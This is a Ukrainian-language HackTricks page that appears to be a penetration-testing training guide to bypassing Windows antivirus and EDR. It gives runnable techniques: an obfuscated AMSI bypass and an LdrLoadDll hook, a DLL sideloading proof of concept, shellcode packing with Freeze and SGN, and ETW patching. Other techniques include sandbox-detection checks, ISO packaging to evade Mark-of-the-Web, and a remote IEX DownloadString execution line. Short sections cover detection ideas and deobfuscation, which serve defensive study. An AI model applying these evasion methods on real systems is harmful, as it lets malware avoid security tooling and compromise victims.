# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

## **Методологія обходу AV**

Наразі AV використовують різні методи для перевірки файлу на шкідливість: static detection, dynamic analysis, і для більш просунутих EDRs — behavioural analysis.

### **Статичне виявлення**

Статичне виявлення досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також витяганням інформації з самого файлу (наприклад, file description, company name, digital signatures, icon, checksum тощо). Це означає, що використання відомих публічних інструментів може призвести до швидшого виявлення, оскільки їх, ймовірно, вже проаналізували і позначили як шкідливі. Є кілька способів обійти таке виявлення:

- **Encryption**

Якщо ви зашифруєте бінарний файл, AV не зможе виявити вашу програму, але вам знадобиться якийсь loader, щоб розшифрувати й виконати програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити деякі рядки в бінарному файлі або скрипті, щоб пройти повз AV, але це може бути трудомістким завданням залежно від того, що ви намагаєтесь обфускувати.

- **Custom tooling**

Якщо ви розробляєте власні інструменти, не буде відомих сигнатур, але це потребує багато часу і зусиль.

> [!TIP]
> Гарний спосіб перевірити статичне виявлення Windows Defender — це [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і змушує Defender сканувати кожен з них окремо; таким чином ви можете точно дізнатися, які рядки або байти в бінарі позначені.

Раджу переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і відстежує шкідливу активність (наприклад, спробу розшифрувати і прочитати паролі браузера, виконати minidump по LSASS тощо). З цим працювати може бути трохи складніше, але ось кілька речей, які допоможуть уникнути sandbox-аналізу.

- **Sleep before execution** Залежно від реалізації, це може бути хорошим способом обійти dynamic analysis AV. AV мають дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому використання довгих пауз може порушити аналіз бінарів. Проблема в тому, що багато sandbox, що використовують AV, можуть просто пропустити sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже мало ресурсів для роботи (наприклад, < 2GB RAM), інакше вони могли б уповільнити машину користувача. Тут також можна проявити креативність — наприклад, перевіряти температуру CPU або швидкість вентиляторів; не все буде емульовано в sandbox.
- **Machine-specific checks** Якщо ви хочете таргетувати користувача, чия робоча станція приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера — якщо він не співпадає, ваша програма може завершити роботу.

Виявилося, що ім'я комп'ютера sandbox у Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера в шкідливому коді перед детонацією; якщо ім'я співпадає з HAL9TH, це означає, що ви в Defender's sandbox, і можна завершити роботу програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже казали раніше, **public tools** зрештою **будуть виявлені**, тож варто задати собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи дійсно вам потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проєктом, який теж дампить LSASS?

Правильна відповідь, мабуть, друга. На прикладі mimikatz — це, ймовірно, один із найбільш (якщо не най-) позначених AV та EDR інструментів; хоча проєкт дуже крутий, з ним складно працювати, щоб обійти AV, тому просто шукайте альтернативи для досягнення потрібної мети.

> [!TIP]
> Коли модифікуєте payloads задля обходу, обов'язково **вимкніть автоматичну відправку зразків** у Defender, і, будь ласка, серйозно, **DO NOT UPLOAD TO VIRUSTOTAL**, якщо ваша мета — досягти обходу в довгостроковій перспективі. Якщо хочете перевірити, чи виявляє конкретний AV ваш payload, встановіть його на VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, поки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLLs для обходу** — за моїм досвідом, DLL-файли зазвичай **набагато рідше виявляються** та аналізуються, тому це простий трюк для уникнення виявлення в деяких випадках (за умови, що ваш payload має спосіб виконання як DLL).

Як видно на цьому зображенні, DLL-пейлоад від Havoc має рівень виявлення 4/26 на antiscan.me, тоді як EXE-пейлоад має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Нижче ми покажемо кілька трюків, які можна застосувати до DLL-файлів, щоб бути значно більш прихованими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який використовує loader, розміщуючи як цільову програму, так і шкідливі payload поряд.

Ви можете шукати програми, вразливі до DLL Sideloading, використовуючи [Siofra](https://github.com/Cybereason/siofra) та наступний powershell скрипт:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL файлів, які вони намагаються завантажити.

Наполегливо рекомендую вам **explore DLL Hijackable/Sideloadable programs yourself**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable програми, вас можуть легко викрити.

Просто помістивши шкідливий DLL з іменем, яке програма очікує завантажити, не вдасться запустити ваш payload, оскільки програма очікує в цьому DLL певні специфічні функції. Щоб вирішити цю проблему, ми використаємо іншу техніку, яку називають **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма робить із проксі (і шкідливого) DLL до оригінального DLL, зберігаючи функціональність програми і дозволяючи обробляти виконання вашого payload.

Я буду використовувати проект [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда створить 2 файли: шаблон вихідного коду DLL і оригінальний (перейменований) файл DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають 0/26 Detection rate в [antiscan.me](https://antiscan.me)! Я б це назвав успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **категорично рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading та також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше вивчити те, про що ми говорили.

### Зловживання перенаправленими експортами (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказування на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач вирішує цей експорт, завантажувач Windows буде:

- Завантажити `TargetDll`, якщо він ще не завантажений
- Визначити `TargetFunc` у ньому

Ключові особливості, які слід розуміти:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується стандартний порядок пошуку DLL, який включає каталог модуля, що виконує розв'язання переспрямування.

Це дозволяє опосередковану sideloading primitive: знайти підписаний DLL, який експортує функцію, переспрямовану до імені модуля, що не є KnownDLL, а потім розмістити цей підписаний DLL у тому ж каталозі разом з attacker-controlled DLL, названим точно як цільовий модуль форварду. Коли викликається переспрямований експорт, завантажувач вирішує форвард і завантажує ваш DLL з тієї ж директорії, виконуючи ваш DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тож його знаходження відбувається за звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписаний системний DLL у папку з правом запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту саму папку. Мінімальний DllMain достатній для отримання виконання коду; вам не потрібно реалізовувати переспрямовану функцію, щоб викликати DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ініціюйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час розв'язування `KeyIsoSetAuditingInterface` loader слідує за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім loader завантажує `NCRYPTPROV.dll` з `C:\test` і виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` вже виконалася

Hunting tips:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте Windows 11 forwarder inventory, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Моніторьте LOLBins (e.g., rundll32.exe), які завантажують підписані DLL з не-системних шляхів, після чого з тієї ж теки завантажуються non-KnownDLLs з тим самим базовим іменем
- Піднімайте тривогу щодо ланцюгів процесів/модулів, наприклад: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Впровадьте політики цілісності коду (WDAC/AppLocker) та забороніть write+execute у директоріях додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб завантажити та виконати свій shellcode приховано.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Уникнення виявлення — це гра в кота й мишу; те, що працює сьогодні, може бути виявлено завтра, тому ніколи не покладайтеся лише на один інструмент — по можливості комбінуйте кілька технік ухилення.

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку антивіруси могли сканувати лише **files on disk**, тож якщо якимось чином виконувати payloads **directly in-memory**, AV не міг нічого зробити, бо не мав достатньої видимості.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (підвищення привілеїв для EXE, COM, MSI або інсталяцій ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

It allows antivirus solutions to inspect script behavior by exposing script contents in a form that is both unencrypted and unobfuscated.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

We didn't drop any file to disk, but still got caught in-memory because of AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Since AMSI is implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have found multiple ways to evade AMSI scanning.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усе, що було потрібно — один рядок коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був виявлений самим AMSI, тому для використання цієї техніки потрібна деяка модифікація.

Ось змінений AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Блокування AMSI шляхом запобігання завантаженню amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Орієнтовна реалізація (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript та у custom loaders (будь‑що, що зазвичай завантажує AMSI).
- Поєднуйте з подачею скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Спостерігалося використання в loaders, що виконуються через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Видалити виявлену сигнатуру**

Ви можете використати інструменти, такі як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Цей інструмент сканує пам'ять поточного процесу в пошуках сигнатури AMSI, а потім перезаписує її інструкціями NOP, ефективно видаляючи її з пам'яті.

**AV/EDR продукти, які використовують AMSI**

Список AV/EDR продуктів, які використовують AMSI, можна знайти за адресою **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте PowerShell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тому ви зможете запускати свої скрипти без їхнього сканування AMSI. Ви можете зробити це:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging — це функція, що дозволяє логувати всі PowerShell команди, виконані в системі. Це корисно для аудиту та усунення неполадок, але також може стати **проблемою для атакуючих, які хочуть ухилитися від виявлення**.

Щоб обійти PowerShell logging, можна використати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: можна скористатися таким інструментом як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: якщо використовувати PowerShell version 2, AMSI не буде завантажено, тож можна запускати скрипти без сканування AMSI. Команда: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: використайте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб запустити powershell без захистів (це те, що використовує `powerpick` з Cobal Strike).


## Obfuscation

> [!TIP]
> Кілька технік обфускації базуються на шифруванні даних, що підвищує ентропію бінарника і полегшує виявлення його AVs та EDRs. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних частин коду, які є чутливими або потребують приховування.

### Deobfuscating ConfuserEx-Protected .NET Binaries

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька шарів захисту, які блокують декомпілятори та песочниці. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати у C# за допомогою інструментів типу dnSpy або ILSpy.

1.  Anti-tampering removal – ConfuserEx шифрує кожне *method body* і дешифрує його всередині статичного конструктора модуля (`<Module>.cctor`). Це також патчить PE checksum, тож будь-яка модифікація призведе до крашу бінарника. Використайте **AntiTamperKiller** щоб знайти зашифровані metadata tables, відновити XOR ключі і переписати чистий assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 anti-tamper параметрів (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними при створенні власного unpacker'а.

2.  Symbol / control-flow recovery – передайте *clean* файл до **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Параметри:
• `-p crx` – вибір профілю ConfuserEx 2  
• de4dot відкотить control-flow flattening, відновить оригінальні namespaces, класи і назви змінних та дешифрує константні рядки.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів на легкі обгортки (так звані *proxy calls*), щоб ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні спостерігати звичайні .NET API такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Manual clean-up – запустіть отриманий бінарник під dnSpy, шукайте великі Base64 блоґи або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *реальний* payload. Часто malware зберігає його як TLV-encoded масив байтів, ініціалізований всередині `<Module>.byte_0`.

Наведений ланцюг відновлює execution flow **без** необхідності запускати зразок — корисно при роботі на offline робочій станції.

> 🛈  ConfuserEx створює кастомний атрибут з назвою `ConfusedByAttribute`, який можна використати як IOC для автоматичної триажі зразків.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source форк [LLVM](http://www.llvm.org/) компіляційного набору, здатний підвищити безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захист від підміни.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації під час компіляції obfuscated code без використання будь-яких зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих фреймворком C++ template metaprogramming, що ускладнить життя тому, хто намагається зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

Ви могли бачити цей екран під час завантаження деяких виконуваних файлів з інтернету та при їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen в основному працює на основі репутації: програми, які рідко завантажуються, спричинять спрацьовування SmartScreen, попереджаючи та перешкоджаючи користувачу виконати файл (хоча файл все одно можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зауважити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викличуть SmartScreen**.

Дуже ефективний спосіб запобігти тому, щоб ваші payloads отримали Mark of The Web — упакувати їх у якийсь контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — потужний механізм логування в Windows, який дозволяє додаткам і компонентам системи **логувати події**. Однак його також можуть використовувати продукти безпеки для моніторингу й виявлення шкідливої активності.

Подібно до того, як AMSI вимикають (обходять), також можливе змусити функцію користувацького простору **`EtwEventWrite`** завершуватися негайно без логування будь-яких подій. Це досягається шляхом патчу цієї функції в пам'яті так, щоб вона одразу повертала управління, фактично вимикаючи логування ETW для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам'ять відоме вже давно і досі є відмінним способом запускати ваші post-exploitation інструменти, не потрапивши під детекцію AV.

Оскільки payload завантажується безпосередньо в пам'ять, не торкаючись диска, нам доведеться лише подбати про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи зробити це:

- **Fork\&Run**

Це передбачає **породження нового "жертвенного" процесу**, інжекцію вашого post-exploitation шкідливого коду в цей процес, виконання коду й завершення створеного процесу після завершення. Це має і переваги, і недоліки. Перевага Fork\&Run у тому, що виконання відбувається **поза** нашим Beacon implant процесом. Тобто якщо щось у нашій post-exploitation дії піде не так або буде виявлено, є **набагато вища ймовірність**, що наш **implant виживе.** Недолік у тому, що є **вища ймовірність** бути виявленим через **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це інжекція post-exploitation шкідливого коду **в власний процес**. Таким чином можна уникнути створення нового процесу й його сканування AV, але недолік у тому, що якщо щось піде не так під час виконання payload, є **набагато вища ймовірність** **втратити ваш beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**, подивіться [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, надаючи скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та середовища на SMB share, ви можете **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

Репозиторій зазначає: Defender все ще сканує скрипти, але використовуючи Go, Java, PHP тощо, ми маємо **більшу гнучкість для обходу статичних сигнатур**. Тестування з випадковими необфускованими reverse shell скриптами цими мовами показало успішні результати.

## TokenStomping

Token stomping — техніка, що дозволяє атакуючому **маніпулювати access token або процесом безпеки на кшталт EDR чи AV**, знижуючи його привілеї так, щоб процес не завершився, але в нього не було дозволів перевіряти шкідливу активність.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
